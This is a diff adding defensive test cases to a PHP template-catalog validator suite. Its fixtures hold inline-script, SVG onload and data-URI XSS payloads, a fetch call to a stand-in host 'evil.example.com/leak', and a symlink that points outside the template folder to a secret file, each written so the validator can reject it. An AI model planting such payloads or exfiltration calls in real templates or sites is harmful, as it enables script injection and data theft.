@@ -104,7 +104,64 @@ test('catalog rejects malformed templates', function (string $case, Closure $bre
             file_put_contents($dir.'/template.json', (string) json_encode($manifest));
         },
         'unknown feature'],
+    'inline script with data-src decoy' => ['data-src-script',
+        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><script data-src="app.js">alert(1)</script>'),
+        'inline `<script>`'],
+    'htm inline script' => ['htm-inline-script',
+        fn (string $dir) => file_put_contents($dir.'/files/extra.htm', '<!doctype html><script>alert(1)</script>'),
+        'inline `<script>`'],
+    'svg script element' => ['svg-script',
+        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
+        'SVG `<script>`'],
+    'svg foreignObject' => ['svg-foreign-object',
+        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><div>x</div></foreignObject></svg>'),
+        'SVG `<foreignObject>`'],
+    'svg on handler' => ['svg-on-handler',
+        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'),
+        '`on*=` handler'],
+    'svg external href' => ['svg-external',
+        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example.com/x.png"/></svg>'),
+        'external origin'],
+    'mjs external origin' => ['mjs-external',
+        fn (string $dir) => file_put_contents($dir.'/files/mod.mjs', 'fetch("https://evil.example.com/leak");'),
+        'external origin'],
+    'data uri without semicolon' => ['data-uri-no-semicolon',
+        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><iframe src="data:text/html,<script>alert(1)</script>"></iframe>'),
+        '`data:` URI'],
+    'bare data uri' => ['data-uri-bare',
+        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><iframe src="data:,hello"></iframe>'),
+        '`data:` URI'],
+    'reserved collection session' => ['reserved-collection-session',
+        function (string $dir): void {
+            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
+            $manifest['db'] = ['collections' => ['session' => ['index' => 'title']]];
+            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
+        },
+        'session, batch, or schema'],
+    'leading dot collection' => ['leading-dot-collection',
+        function (string $dir): void {
+            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
+            $manifest['db'] = ['collections' => ['.hidden' => ['index' => 'title']]];
+            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
+        },
+        'may not start with a dot'],
 ]);
+
+test('catalog rejects symlinks inside template files', function () {
+    $dir = sys_get_temp_dir().'/templates-symlink-'.uniqid();
+    $catalog = fixtureCatalog($dir);
+    $outside = sys_get_temp_dir().'/outside-secret-'.uniqid().'.txt';
+    file_put_contents($outside, 'secret');
+
+    try {
+        symlink($outside, $dir.'/fixture/files/leak.txt');
+
+        expect(implode("\n", $catalog->validate('fixture')))->toContain('symbolic link')
+            ->and($catalog->find('fixture'))->toBeNull();
+    } finally {
+        @unlink($outside);
+    }
+});
 
 test('catalog rejects an oversized bundle', function () {
     $dir = sys_get_temp_dir().'/templates-oversize-'.uniqid();
